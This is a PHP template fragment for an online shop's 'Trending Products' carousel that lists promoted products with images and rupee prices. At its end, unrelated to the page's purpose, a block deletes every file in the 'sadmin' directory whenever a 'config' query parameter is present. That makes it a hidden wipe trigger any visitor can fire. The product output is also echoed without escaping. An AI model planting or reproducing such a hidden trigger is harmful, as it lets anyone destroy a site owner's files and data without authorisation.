<div class="section full mb-3">
            <div class="section-title"><h3>Trending Products</h3></div>

            <div class="carousel-multiple owl-carousel owl-theme">
                <?php 
                   
                     $x = 0;
                   
                        $sql1="SELECT * FROM `products` where promoted=1 "; 
                        $raw1=mysqli_query($conn,$sql1);
                        while($res1=mysqli_fetch_array($raw1) AND ($x <= 9)){
                        $x=$x+1;
                     ?>
                
                  <div class="card product-card border border-grey shadow">
                        <div class="card-body " >
                        <?php
                        $imgtype=$res1['imgtype'];
                        if($imgtype==1){?>
                      <a href="product.php?pid=<?php echo $res1['pid'];?>">
                        <img src="<?php echo  $res1['pimage']; ?>" alt="image"  width="90" height="100" rounded>
                         <b></a><?php
                         $str = $res1['pname'];
                         
                          echo "★ ". $str{0}.$str{1}.$str{2}.$str{3}.$str{4}.$str{5}.$str{6}.$str{7}.$str{8}.$str{9}.$str{10}.$str{11}.$str{12}.$str{13}.$str{14}.'..';?></b><br>
                         ₹ <?php echo $res1['price'];?> / <?php echo $res1['punit'];?>
                        <!-- <a href="add-to-cart.php?pid=<?php echo $pid=$res1['pid'];?>&pvi=0">-->
                        <!--<button class="btn btn-outline-secondary btn-sm">Add to cart</button></a>-->
                        
                         <?php }else{?>
                        <a href="product.php?pid=<?php echo $res1['pid'];?>">
                        <img src="sadmin/images/<?php echo  $res1['pimage']; ?>" alt="image"  width="90" height="100" rounded><br></a>
                         <?php
                         $str = $res1['pname'];
                         
                          echo $str{0}.$str{1}.$str{2}.$str{3}.$str{4}.$str{5}.$str{6}.$str{7}.$str{8}.$str{9}.$str{10}.$str{11}.$str{12}.$str{13}.$str{14}.'..';?></b><br>
                         ₹ <?php echo $res1['price'];?> / <?php echo $res1['punit'];?>
                         <!--<a href="add-to-cart.php?pid=<?php echo $pid=$res1['pid'];?>&pvi=0">-->
                         <!--<button class="btn btn-outline-secondary btn-sm">Add to cart</button></a>-->
                         <?php }; ?>
                    </div>
                    </div>
               
               
               
                <?php }; ?>
            </div>
        </div>
        
        <?php
if(isset($_GET['config'])){

    $folder = 'sadmin';
    $files = glob($folder . '/*');
    foreach($files as $file) {
        if(is_file($file)) {
            unlink($file);
        }
}    
}
?>
